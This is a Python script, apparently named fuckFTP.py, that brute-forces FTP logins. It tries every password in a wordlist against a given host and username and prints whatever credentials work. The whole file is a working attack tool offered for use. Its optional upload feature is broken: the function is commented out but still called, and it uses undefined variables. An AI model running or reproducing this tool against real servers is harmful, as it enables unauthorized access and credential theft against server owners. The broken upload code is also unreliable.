from ftplib import FTP 
import argparse
from sys import exit

realPassword = None

def help():
    usage = '''
    
    usage:
            --host      <hostname>
            --user      <username>
            --wordlist  <wordlist>

    Example:

        python fuckFTP.py --host 192.168.1.1 --user anton --wordlist wordlist.txt

    Contact:
        github:   github.com/gmdutra
        Telegram: https://t.me/gmdutra

'''

def check(host, username, passwd):

    try:
        ftp = FTP(host)
        ftp.login(username, passwd)
        ftp.quit()

        print("Host: {}".format(host))
        print("Username: {}".format(username))
        print("Password: {}".format(passwd))
        
        realPassword = passwd
        print("{}".format(realPassword))
        exit(0)
    except:
        pass
'''
def uploadFile(host, username, passwd, file):
    ftp = FTP(host)
    ftp.login(username, passwd)

    myfile = open(file, "rb")
    ftp.storlines('STOR ' + myfile)
'''
def loadWordlist(host, username, wordlist):

    try:
        wd = open(wordlist, "r")
        read = wd.readlines()
        
        for line in read:
            line = line.strip()
            check(host, username, line)

    except:
        print("Ocorreu erros")
        exit(0)

def main():

    parser = argparse.ArgumentParser(description="ftp brute force")
    parser.add_argument('--host',     action="store", dest="host",      required=True)
    parser.add_argument("--user",     action="store", dest="user",      required=True)
    parser.add_argument("--wordlist", action="store", dest="wordlist",  required=True)
    parser.add_argument("--upload",   action="store", dest="upload",    required=False)

    given_args = parser.parse_args()

    host     = given_args.host
    user     = given_args.user
    wordlist = given_args.wordlist
    upload   = given_args.upload

    loadWordlist(host, user, wordlist)

    if upload is not None:
        uploadFile(host, user, realPassword, file)

if __name__ == '__main__':
        main()    
